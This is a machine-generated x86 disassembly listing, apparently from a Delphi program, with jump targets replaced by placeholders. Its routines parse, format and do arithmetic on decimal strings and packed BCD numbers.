jmp r-xdata
push ebx
mov eax [ ebx ]
call sub_40425c
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_4044bc
cmp [ ebp - 0x4 ] 0xffffff01
je r-xdata
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_46aa38
mov edx [ ebp - 0x38 ]
lea eax [ ebp - 0x14 ]
call sub_404034
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_404264
dec esi
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b2a7
lea eax [ ebp - 0x58 ]
mov edx 0x5
call sub_403fc0
lea eax [ ebp - 0x3c ]
mov edx 0x4
call sub_403fc0
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_403fc0
retn
mov eax [ ebx ]
call sub_40425c
mov esi eax
sub esi [ ebp - 0x4 ]
test esi esi
jne r-xdata
test esi esi
jle r-xdata
mov edx r-xdata
lea eax [ ebp - 0x40 ]
call sub_402b3c
lea eax [ ebp - 0x44 ]
mov dl [ ebp - 0x29 ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x44 ]
lea eax [ ebp - 0x40 ]
mov cl 0x2
call sub_402b0c
lea edx [ ebp - 0x40 ]
lea eax [ ebp - 0x3c ]
call sub_404200
mov edx [ ebp - 0x3c ]
mov ecx [ ebx ]
mov eax ebx
call sub_4042a8
jmp r-xdata
test esi esi
jge r-xdata
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebx ]
mov ecx esi
mov edx 0x1
call sub_4044bc
push [ ebp - 0x48 ]
lea eax [ ebp - 0x4c ]
mov dl [ ebp - 0x29 ]
call sub_404184
push [ ebp - 0x4c ]
lea eax [ ebp - 0x50 ]
push eax
lea edx [ esi + 0x1 ]
mov eax [ ebx ]
mov ecx [ ebp - 0x4 ]
call sub_4044bc
push [ ebp - 0x50 ]
mov eax ebx
mov edx 0x3
call sub_40431c
jmp r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x28 ]
cmp eax 0x400
jle r-xdata
lea eax [ ebp - 0x54 ]
mov dl [ ebp - 0x29 ]
call sub_404184
push [ ebp - 0x54 ]
lea ecx [ ebp - 0x58 ]
mov edx esi
neg edx
mov al 0x30
call sub_40464c
push [ ebp - 0x58 ]
push [ ebx ]
mov eax ebx
mov edx 0x3
call sub_40431c
mov eax ebx
call sub_403f9c
sub_46b2c0
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x1 ]
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x2 ] al
push eax
push ebx
push ecx
push edx
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x1 ] 0x0
mov cl 0x0
mov ch 0x0
mov ah [ ebp + 0x8 ]
mov dl 0x0
mov dh 0x0
cmp al 0x0
je r-xdata
add dh al
mov dl 0x1
cmp cl 0x0
jne r-xdata
cmp al [ ebp - 0x2 ]
je r-xdata
cmp dh 0x6b
ja r-xdata
mov cl 0x1
mov dl 0x0
mov edi [ ebp + 0xc ]
jmp r-xdata
mov al [ edi ]
add edi 0x1
cmp dl 0x0
jne r-xdata
add ch 0x1
jmp r-xdata
cmp ch ah
ja r-xdata
add ah 0x1
pop edi
pop edx
pop ecx
pop ebx
pop eax
mov al [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0xc
mov [ ebp - 0x1 ] 0x1
sub_46b330
push ebx
push esi
push edi
mov esi eax
mov bl 0x1
mov eax esi
call sub_40425c
test eax eax
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edi 0x1
inc edi
dec eax
jne r-xdata
sub dl 0x2
je r-xdata
mov dl [ esi + edi - 0x1 ]
sub dl 0x2e
je r-xdata
xor ebx ebx
jmp r-xdata
sub_46b364
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_46b330
test al al
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_403ff0
jmp r-xdata
mov eax esi
call sub_46b330
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_40445c
push eax
mov eax esi
call sub_40445c
push eax
push 0x9
call sub_46b2c0
test al al
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_46b03c
mov ecx edi
mov edx esi
mov eax ebx
call sub_46ad9c
jmp r-xdata
sub_46b3d4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46b475
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_403ff0
mov eax esi
mov edx r-xdata
call sub_403ff0
jmp r-xdata
mov eax [ ebx ]
mov edx edi
call sub_46a71c
test eax eax
jge r-xdata
mov eax [ esi ]
call sub_4083f0
inc eax
lea edx [ ebp - 0x8 ]
call sub_4082b4
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403ff0
lea ecx [ ebp - 0x10 ]
mov eax [ ebx ]
mov edx edi
call sub_46ab98
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_46a6e0
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_403ff0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b47c
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403fc0
retn
sub_46b494
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46b619
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ rw-data ]
mov bl [ ebx ]
mov eax edi
mov edx [ ebp - 0x4 ]
call sub_403ff0
jmp r-xdata
mov eax [ edi ]
cmp [ eax ] 0x30
je r-xdata
push edi
mov eax [ edi ]
call sub_40425c
mov ecx eax
dec ecx
mov eax [ edi ]
mov edx 0x2
call sub_4044bc
test si si
jne r-xdata
test si si
jle r-xdata
mov ecx [ edi ]
mov eax edi
mov edx r-xdata
call sub_4042a8
jmp r-xdata
mov eax [ edi ]
call sub_40425c
movsx edx si
neg edx
cmp eax edx
jg r-xdata
mov edx r-xdata
lea eax [ ebp - 0xc ]
call sub_402b3c
lea eax [ ebp - 0x10 ]
mov edx ebx
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
mov cl 0x2
call sub_402b0c
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_404200
push [ ebp - 0x8 ]
lea ecx [ ebp - 0x14 ]
movsx edx si
mov al 0x30
call sub_40464c
push [ ebp - 0x14 ]
push [ edi ]
mov eax edi
mov edx 0x3
call sub_40431c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b620
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_403fc0
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
mov eax [ edi ]
call sub_40425c
movsx edx si
neg edx
cmp eax edx
jle r-xdata
mov eax [ edi ]
call sub_40425c
movsx edx si
neg edx
sub edx eax
lea ecx [ ebp - 0x18 ]
mov al 0x30
call sub_40464c
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_404264
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
movsx ecx si
neg ecx
mov eax [ edi ]
mov edx 0x1
call sub_4044bc
push [ ebp - 0x1c ]
lea eax [ ebp - 0x20 ]
mov edx ebx
call sub_404184
push [ ebp - 0x20 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi ]
call sub_40425c
mov ecx eax
movsx edx si
neg edx
inc edx
mov eax [ edi ]
call sub_4044bc
push [ ebp - 0x24 ]
mov eax edi
mov edx 0x3
call sub_40431c
sub_46b638
push ebp
mov ebp esp
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40444c
xor eax eax
push ebp
push sub_46b893
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0xd ] al
lea eax [ ebp - 0x14 ]
mov dl [ ebp - 0xd ]
call sub_404184
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_4045a0
mov esi eax
test si si
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_40425c
mov esi eax
dec esi
mov eax ebx
mov edx r-xdata
call sub_403ff0
mov eax ebx
mov edx r-xdata
call sub_403ff0
sub si 0x2
mov eax [ ebp - 0x4 ]
call sub_40445c
mov al [ eax ]
cmp al [ ebp - 0xd ]
jne r-xdata
lea ecx [ ebp - 0x28 ]
mov edx esi
dec edx
mov eax [ ebx ]
call sub_46b494
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_403ff0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40425c
mov edx eax
dec edx
lea ecx [ ebp - 0x24 ]
mov al 0x30
call sub_40464c
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x20 ]
mov edx r-xdata
call sub_4042a8
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_4043a8
jne r-xdata
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov dl [ ebp - 0xd ]
call sub_404184
mov edx [ ebp - 0x1c ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_40cd88
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
call sub_404034
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40425c
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4044bc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b89a
lea eax [ ebp - 0x34 ]
mov edx 0x9
call sub_403fc0
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403fc0
retn
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404034
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_404034
mov eax [ ebp - 0xc ]
call sub_40425c
mov edi eax
dec edi
lea ecx [ ebp - 0x2c ]
movsx edx di
mov al 0x30
call sub_40464c
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0xc ]
call sub_404264
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_46a71c
test eax eax
jge r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4043a8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40445c
cmp [ eax ] 0x30
je r-xdata
mov eax ebx
call sub_403f9c
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404264
mov eax ebx
mov edx r-xdata
call sub_404264
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40425c
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4044bc
dec esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4043a8
je r-xdata
lea ecx [ ebp - 0x34 ]
mov eax [ ebx ]
mov edx esi
call sub_46b494
mov edx [ ebp - 0x34 ]
mov eax ebx
call sub_403ff0
mov eax [ ebx ]
call sub_40425c
movsx edx di
add edx 0x40
cmp eax edx
jl r-xdata
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_46b3d4
mov edx [ ebp - 0x30 ]
mov eax ebx
call sub_404264
lea eax [ ebp - 0xc ]
mov ecx r-xdata
mov edx [ ebp - 0x8 ]
call sub_4042a8
sub_46b8cc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40444c
mov eax [ ebp - 0x8 ]
call sub_40444c
xor eax eax
push ebp
push sub_46ba29
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40445c
mov al [ eax ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40445c
pop edx
cmp dl [ eax ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40445c
mov bl [ eax ]
cmp bl 0x2d
je r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40445c
cmp [ eax ] 0x2d
jne r-xdata
mov al 0x1
cmp bl 0x2d
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_40445c
cmp [ eax ] 0x2d
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40425c
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4044bc
mov eax [ ebp - 0x4 ]
call sub_40445c
cmp [ eax ] 0x30
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40425c
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_4044bc
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40425c
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4044bc
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_40445c
cmp [ eax ] 0x30
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40425c
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_4044bc
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_46b638
lea ecx [ ebp - 0xc ]
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_46b364
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403ff0
test bl bl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ba30
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403fc0
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4042a8
sub_46ba44
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46bb20
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46b330
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_4043a8
jne r-xdata
mov eax esi
call sub_46b330
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_4043a8
jne r-xdata
mov eax edi
mov edx ebx
call sub_403ff0
jmp r-xdata
test ebx ebx
je r-xdata
mov edx esi
mov eax ebx
call sub_407fdc
test eax eax
jne r-xdata
mov eax edi
mov ecx ebx
mov edx r-xdata
call sub_4042a8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bb27
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov eax edi
mov edx r-xdata
call sub_403ff0
jmp r-xdata
mov eax ebx
mov edx r-xdata
call sub_4043a8
jne r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_46b8cc
mov eax edi
mov edx r-xdata
call sub_403ff0
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov eax [ ebp - 0x4 ]
call sub_469cb0
jmp r-xdata
sub_46bb90
cmp cl ch
jae r-xdata
retn
mov ah dl
add cl 0x1
cmp cl ch
jne r-xdata
lodsb [ esi ]
mov dl al
shr al 0x4
mov al 0x0
jmp r-xdata
and ah 0xf
shl ah 0x4
or ah al
mov al ah
stosb [ edi ]
add cl 0x1
jmp sub_46bb90
sub_46bbc8
push ebp
mov ebp esp
push esi
push edi
push ebx
push ecx
push edx
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov cl [ ebp + 0x10 ]
mov ch [ ebp + 0xc ]
cmp cl [ ebp + 0x18 ]
ja r-xdata
sub cl [ ebp + 0x18 ]
cmp cl [ ebp + 0x18 ]
je r-xdata
mov ch [ ebp + 0xc ]
mov cl [ ebp + 0x18 ]
cmp ch [ ebp + 0x14 ]
jae r-xdata
sub cl 0x1
cmp cl 0x0
je r-xdata
add cl [ ebp + 0x14 ]
call sub_46bb80
cmp ch [ ebp + 0x14 ]
je r-xdata
mov ah [ ebp + 0x18 ]
sub ah [ ebp + 0x10 ]
mov cl [ ebp + 0x18 ]
add cl [ ebp + 0x14 ]
add cl ch
jmp r-xdata
lodsb [ esi ]
mov dl al
shr al 0x4
or al 0x0
stosb [ edi ]
mov al dl
mov ah [ ebp + 0x18 ]
mov [ ebp + 0x10 ] ah
mov cl 0x1
jmp r-xdata
mov al 0x0
stosb [ edi ]
sub cl 0x1
jmp r-xdata
pop edx
pop ecx
pop ebx
pop edi
pop esi
pop ebp
retn 0x18
mov cl ch
call sub_46bbb8
jmp r-xdata
lodsb [ esi ]
cmp al 0x0
je r-xdata
sub cl [ ebp + 0x18 ]
call sub_46bbb8
call sub_46bb80
mov cl [ ebp + 0x10 ]
cmp cl [ ebp + 0x18 ]
jbe r-xdata
mov dl al
cmp ch [ ebp + 0x14 ]
jbe r-xdata
cmp cl 0x0
je r-xdata
sub ah 0x1
cmp ah 0x0
je r-xdata
mov [ edi ] al
add edi 0x1
add ch [ ebp + 0x10 ]
mov cl 0x0
call sub_46bb90
mov cl [ ebp + 0xc ]
cmp cl [ ebp + 0x14 ]
jbe r-xdata
mov ch [ ebp + 0x14 ]
sub ah 0x1
sub cl 0x2
jmp r-xdata
sub cl [ ebp + 0x14 ]
call sub_46bbb8
jmp r-xdata
cmp ah 0x0
je r-xdata
sub_46bcac
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x1 ] al
push esi
push edi
push ebx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
xor ecx ecx
mov cx [ ebp + 0x8 ]
mov dl 0x0
cld
loop r-xdata
sub al 0x30
cmp dl 0x0
jne r-xdata
lodsb [ esi ]
cmp al [ ebp - 0x1 ]
je r-xdata
cmp dl 0x0
je r-xdata
or al ah
stosb [ edi ]
shl al 0x4
mov ah al
jmp r-xdata
pop ebx
pop edi
pop esi
pop ecx
pop ebp
retn 0xc
mov al ah
stosb [ edi ]
not dl
sub_46bcf8
push ebx
push esi
push edi
add esp 0xffffffdc
mov edx [ rw-data ]
mov dl [ edx ]
mov [ esp + 0x1 ] dl
mov esi eax
mov [ esp ] 0x0
jmp r-xdata
mov bl [ esi ]
test bl bl
jne r-xdata
push esi
mov esi r-xdata
lea edi [ esp + 0x8 ]
mov ecx 0x8
[ edi ] [ esi ]
pop esi
mov al [ esp + 0x1 ]
and eax 0xff
bts [ esp + 0x4 ] eax
and ebx 0xff
bt [ esp + 0x4 ] ebx
jb r-xdata
mov al [ esp ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
inc esi
mov [ esp ] 0x1
jmp r-xdata
sub_46bd78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46bf4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ rw-data ]
mov bl [ ebx ]
mov eax esi
call sub_40445c
call sub_46bcf8
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_4043a8
je r-xdata
mov [ ebp - 0x5 ] 0x0
jmp r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] 0x2
mov ebx [ ebp - 0x4 ]
add ebx 0x2
mov eax ebx
xor ecx ecx
mov edx 0x20
call sub_402c58
jmp r-xdata
test esi esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bf54
lea eax [ ebp - 0xc ]
call sub_403f9c
retn
mov [ ebp - 0x5 ] 0x1
mov [ ebp - 0x6 ] 0x0
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404184
mov eax [ ebp - 0xc ]
mov edx esi
call sub_4045a0
mov edi eax
mov eax esi
call sub_40445c
mov ebx eax
jmp r-xdata
mov al [ ebx ]
mov edx eax
and edx 0xff
bt [ rw-data ] edx
jb r-xdata
inc ebx
test di di
jbe r-xdata
cmp al 0x30
je r-xdata
dec edi
mov eax ebx
call sub_408904
lea esi [ ebx + eax - 0x1 ]
jmp r-xdata
mov al [ esi ]
and eax 0xff
bt [ rw-data ] eax
jb r-xdata
mov [ esi ] 0x0
dec esi
cmp [ ebx ] 0x2d
jne r-xdata
mov al [ ebx ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x6 ] 0x1
test di di
jbe r-xdata
inc ebx
cmp al 0x2b
jne r-xdata
dec edi
mov eax ebx
call sub_408904
mov [ ebp - 0x8 ] ax
cmp [ ebp - 0x8 ] 0x40
jbe r-xdata
inc ebx
test di di
jbe r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax esi
xor ecx ecx
mov edx 0x20
call sub_402c58
cmp [ ebx ] 0x30
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
test di di
jbe r-xdata
dec edi
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xa
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] 0x2
push esi
push ebx
mov ax [ ebp - 0x8 ]
push eax
call sub_46bcac
jmp r-xdata
mov al [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] al
jmp r-xdata
cmp di 0x40
ja r-xdata
mov al [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] al
cmp [ ebp - 0x6 ] 0x0
je r-xdata
mov al [ ebp - 0x8 ]
mov edx eax
dec edx
mov ecx [ ebp - 0x4 ]
mov [ ecx ] dl
cmp [ ebp - 0x6 ] 0x0
je r-xdata
test di di
jbe r-xdata
mov [ ebp - 0x8 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] 0x80
jmp r-xdata
mov edx edi
sub al dl
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] al
jmp r-xdata
mov edx edi
sub al dl
add al 0x80
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] al
jmp r-xdata
sub_46bf6c
push ebp
mov ebp esp
push ecx
push esi
push ebx
mov esi [ ebp + 0xc ]
mov cx [ ebp + 0x8 ]
cld
mov [ ebp - 0x2 ] cx
pop ebx
pop esi
mov ax [ ebp - 0x2 ]
pop ecx
pop ebp
retn 0x8
lodsb [ esi ]
cmp al 0x0
jne r-xdata
shr al 0x4
cmp al 0x0
jne r-xdata
sub cx 0x1
cmp cx 0x0
je r-xdata
sub cx 0x1
sub cx 0x1
jmp r-xdata
cmp cx 0x0
je r-xdata
sub_46bfb0
push ebp
mov ebp esp
push ecx
push esi
push edi
push ebx
push ecx
push edx
mov [ ebp - 0x2 ] 0x0
mov cx [ ebp + 0x8 ]
mov dh 0x0
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov cx [ ebp + 0x8 ]
add edi 0x1
add esi 0x1
add ebx 0x1
sub cx 0x1
cmp cx 0x2
jne r-xdata
pop edx
pop ecx
pop ebx
pop edi
pop esi
pop ecx
pop ebp
retn 0x10
cmp [ ebp - 0x2 ] 0x1
jne r-xdata
sub cx 0x1
jmp r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
mov al [ esi ]
mov ah [ ebx ]
and al 0xf
and ah 0xf
mov dl ah
sub dl al
call sub_46bb70
mov ah dl
sub cx 0x1
cmp cx 0x0
je r-xdata
mov ah 0x0
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
cmp cx 0x2
jbe r-xdata
mov dl 0x0
or dl ah
mov [ edi ] dl
mov al [ esi ]
mov dl [ ebx ]
shr al 0x4
shr dl 0x4
sub dl al
call sub_46bb70
shl dl 0x4
or dl ah
mov [ edi ] dl
sub edi 0x1
sub esi 0x1
sub ebx 0x1
sub cx 0x1
jmp r-xdata
cmp cx 0x0
je r-xdata
sub_46c068
push ebp
mov ebp esp
push ecx
push esi
push edi
push ebx
push ecx
push edx
mov cx [ ebp + 0x8 ]
mov dh 0x0
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x2 ] 0x0
mov cx [ ebp + 0x8 ]
add edi 0x1
add esi 0x1
add ebx 0x1
sub cx 0x1
cmp cx 0x2
jne r-xdata
pop edx
pop ecx
pop ebx
pop edi
pop esi
pop ecx
pop ebp
retn 0x10
cmp [ ebp - 0x2 ] 0x1
jne r-xdata
sub cx 0x1
jmp r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
mov al [ esi ]
mov ah [ ebx ]
and al 0xf
and ah 0xf
mov dl ah
add dl al
call sub_46bb60
mov ah dl
sub cx 0x1
cmp cx 0x0
je r-xdata
mov ah 0x0
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
cmp cx 0x2
jbe r-xdata
mov dl 0x0
or dl ah
mov [ edi ] dl
mov al [ esi ]
mov dl [ ebx ]
shr al 0x4
shr dl 0x4
add dl al
call sub_46bb60
shl dl 0x4
or dl ah
mov [ edi ] dl
sub edi 0x1
sub esi 0x1
sub ebx 0x1
sub cx 0x1
jmp r-xdata
cmp cx 0x0
je r-xdata
sub_46c120
push ebp
mov ebp esp
push ecx
push esi
push edi
push ebx
push edx
mov cx [ ebp + 0xc ]
mov dx [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x4 ] 0x0
cld
cmp dx 0x0
jle r-xdata
lodsb [ esi ]
mov ah [ edi ]
inc edi
cmp al ah
jne r-xdata
pop edx
pop ebx
pop edi
pop esi
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0x10
mov ah [ edi ]
inc edi
sub dx 0x2
cmp ah 0x0
je r-xdata
mov bl ah
mov ah al
shr ah 0x4
mov bh bl
shr bh 0x4
cmp bh ah
jne r-xdata
sub cx 0x1
sub dx 0x1
cmp cx 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp bh ah
ja r-xdata
cmp cx 0x0
je r-xdata
sub cx 0x1
sub dx 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov ah al
mov bh bl
and ah 0xf
and bh 0xf
cmp cx 0x0
je r-xdata
sub_46c1d4
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov esi eax
xor edi edi
mov ebp edx
mov eax [ esi ]
mov dl [ eax ]
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp edi eax
jl r-xdata
mov al [ ebp ]
and dl 0xf
shl edx 0x4
xor ecx ecx
mov cl al
shr ecx 0x4
or dl cl
mov ecx [ esi ]
mov [ ecx ] dl
mov edx eax
inc [ esi ]
inc ebp
add edi 0x2
pop edx
pop ebp
pop edi
pop esi
retn
sub_46c214
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cx
mov esi edx
mov edi eax
mov [ ebp - 0x3 ] 0x1
xor eax eax
mov al [ edi ]
cmp ax [ ebp - 0x2 ]
jne r-xdata
mov al [ edi + 0x1 ]
test al 0x80
setne [ ebp - 0xb ]
and al 0x3f
and eax 0xff
mov [ ebp - 0xa ] ax
mov al [ ebp - 0x2 ]
mov [ esi ] al
mov al [ ebp + 0x8 ]
mov [ esi + 0x1 ] al
lea eax [ edi + 0x2 ]
mov [ ebp - 0x8 ] eax
lea ebx [ esi + 0x2 ]
mov eax ebx
xor ecx ecx
mov edx 0x20
call sub_402c58
xor eax eax
mov al [ edi ]
cmp ax [ ebp - 0x2 ]
jbe r-xdata
mov al [ edi + 0x1 ]
and al 0x3f
and eax 0xff
cmp ax [ ebp + 0x8 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov al [ ebp - 0xa ]
mov dl [ edi ]
sub dl al
push edx
push eax
mov al [ ebp - 0x2 ]
mov dl [ ebp + 0x8 ]
and dl 0x3f
sub al dl
push eax
mov al [ ebp + 0x8 ]
and al 0x3f
push eax
push ebx
call sub_46bbc8
cmp [ ebp - 0xb ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
xor eax eax
mov al [ edi ]
push eax
call sub_46bf6c
cmp ax [ ebp - 0x2 ]
jbe r-xdata
push esi
mov eax edi
mov edi esi
mov esi eax
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
xor edx edx
mov dl [ esi ]
mov eax edx
shr eax 0x1
and edx 0x1
cmp edx 0x1
jne r-xdata
